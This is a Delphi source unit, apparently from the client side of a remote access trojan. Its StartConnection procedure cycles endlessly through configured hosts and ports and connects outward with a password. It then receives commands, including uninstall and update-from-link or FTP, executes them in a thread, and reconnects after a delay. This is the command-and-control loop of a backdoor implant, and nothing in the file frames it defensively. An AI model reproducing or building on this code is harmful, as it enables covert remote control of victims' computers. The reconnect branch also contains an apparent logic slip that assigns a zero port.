unit UnitConnection;

interface

uses
  Windows, SocketUnitEx, UnitExecuteCommands, UnitConstants, UnitConfiguration,
  UnitVariables, UnitShell, UnitCommands, UnitFunctions;
                                
procedure StartConnection;

implementation
        
procedure StartConnection;
var
  ConnId: Integer;
begin
  ConnId := 0;

  repeat
    MainConnection := TClientSocket.Create;

    if ConnId > High(_Hosts) then ConnId := 0;
    if (_Hosts[ConnId] <> '') and (_Ports[ConnId] <> 0) then
    try
      MainHost := _Hosts[ConnId];
      MainPort := _Ports[ConnId];

      if (ReconnectHost <> '') and (ReconnectPort = 0) then
      begin
        MainHost := ReconnectHost;
        MainPort := ReconnectPort;
      end;
                               
      CloseConnection := False;

      MainConnection.Connect(MainHost, MainPort);
      if MainConnection.Connected = True then
      MainConnection.SendDatas(CLIENTNEW + '|' + _Password);

      while CloseConnection = False do
      begin
        if MainConnection.Connected = False then CloseConnection := True else
        begin
          MainDatas := MainConnection.RecvDatas;
          if MainDatas = '' then CloseConnection := True;

          if (Copy(MainDatas, 1, Pos('|', MainDatas) - 1) = CLIENTCLOSE) or
            (Copy(MainDatas, 1, Pos('|', MainDatas) - 1) = CLIENTRESTART) or
            (Copy(MainDatas, 1, Pos('|', MainDatas) - 1) = CLIENTUNINSTALL) or
            (Copy(MainDatas, 1, Pos('|', MainDatas) - 1) = CLIENTUPDATEFROMLOCAL) or
            (Copy(MainDatas, 1, Pos('|', MainDatas) - 1) = CLIENTUPDATEFROMLINK) or
            (Copy(MainDatas, 1, Pos('|', MainDatas) - 1) = CLIENTUPDATEFROMFTP) or
            (Copy(MainDatas, 1, Pos('|', MainDatas) - 1) = CLIENTUPDATECONFIG)
          then ShellCmd := 'exit';

          MyStartThread(@ExecuteCommands);
          ProcessMessages;
        end;
      end;
    except
    end;

    Inc(ConnId);

    MainConnection.Disconnect;
    MainConnection.Free;
    MainConnection := nil;

    Sleep(_Delay * 1000);
  until False;
end;

end.
